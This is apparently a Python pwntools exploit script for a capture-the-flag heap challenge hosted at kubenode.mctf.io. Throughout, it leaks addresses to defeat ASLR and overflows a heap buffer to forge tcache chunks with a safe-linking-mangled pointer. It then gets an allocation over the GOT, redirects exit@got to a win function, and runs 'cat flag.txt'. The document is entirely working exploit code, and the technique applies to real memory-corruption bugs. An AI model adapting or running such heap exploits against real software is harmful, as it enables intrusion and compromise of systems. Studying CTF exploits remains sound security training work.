from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    if len(data) > 0:
        p.recvuntil(b'data:\n')
        p.send(data)
    recv_menu()

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)
register(2, 1, 16, b'C'*16)

val, chk0 = inspect(0)
_, chk1 = inspect(1)

base_addr = val - 0x136c
win_func = base_addr + 0x14a8

delete(2)
delete(1)
delete(0)

# We target 0x3650
target_addr = base_addr + 0x3650
fd = target_addr ^ (chk1 >> 12)

payload = b'A' * 24
payload += p64(0x21)
payload += p64(fd)

for i in range(2, 2000):
    payload = payload.ljust(i * 32 - 8, b'\x00')
    payload += p64(0x21)

payload = payload.ljust(65536, b'\x00')

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')
p.send(payload)
recv_menu()

register(1, 1, 16, b'X'*16)

# Now we allocate at 0x3650!
# We will write 65536 bytes.
# 0x3650: dummy 8 bytes
# 0x3658: exit@got -> win_func
# 0x3660 to 0x367f: dummy 32 bytes
# 0x3680: "cat flag.txt\x00"
# Then just pad the rest of the 65536 bytes. The kernel will reject the write at the page boundary.

payload_final = p64(0)              # 0x3650
payload_final += p64(win_func)      # 0x3658 (exit@got)
payload_final += b'A' * 32          # 0x3660 - 0x367f
payload_final += b'cat flag.txt\x00' # 0x3680
payload_final = payload_final.ljust(65536, b'\x00')

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'2')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')

# We send exactly what we can.
# Once read hits unmapped memory, it returns -1 and exits.
# We don't even need to send the full 65536 if the socket blocks or closes.
# Let's send the full payload to ensure it reaches the faulting address.
p.send(payload_final)

try:
    print(p.recvall(timeout=5).decode())
except Exception as e:
    print(e)

p.close()
